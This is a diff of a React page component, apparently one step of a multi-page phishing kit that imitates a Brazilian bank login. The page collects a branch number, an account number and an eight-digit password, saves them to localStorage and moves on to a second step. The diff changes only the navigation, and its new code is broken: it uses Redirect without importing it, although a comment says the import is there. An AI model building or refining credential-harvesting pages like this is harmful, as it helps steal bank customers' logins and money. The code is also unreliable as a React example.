@@ -1,10 +1,11 @@
 import React, { useRef, useState } from 'react'
 import InputMask from 'react-input-mask';
-import {Link} from 'react-router-dom'
+import { Link } from 'react-router-dom';  // Importa Redirect
 import Navbar from '../components/Navbar'
 import './PageOne.css'
 
 const PageOne = () => {
+  const [redirect, setRedirect] = useState(false);  // Estado para redirecionamento
 
   const [agencia, setAgencia] = useState(null)
   const [conta, setConta] = useState(null)
@@ -14,7 +15,10 @@ const PageOne = () => {
     localStorage.setItem('agencia', agencia);
     localStorage.setItem('conta', conta);
     localStorage.setItem('senha8', senha8);
-    window.location.href = '/step2';
+    setRedirect(true);
+    if (redirect) {
+      return <Redirect to="/step2" />;
+    }
   }
 
   const defineAgencia = (e) => {
@@ -43,9 +47,11 @@ const PageOne = () => {
           <span className='resgatar-btn' onClick={() => closeModal()}>RESGATAR PRODUTOS</span>
         </div>
       </div>
+      <Link to='/step2'>
       <div className='next-btn-page2' onClick={() => setStore()}>
         <span>CONTINUAR</span>
       </div>
+      </Link>
       <Navbar />
       <div className='navegacao-frame'>
         <i className="bi bi-arrow-left" id='arrow-left'></i>
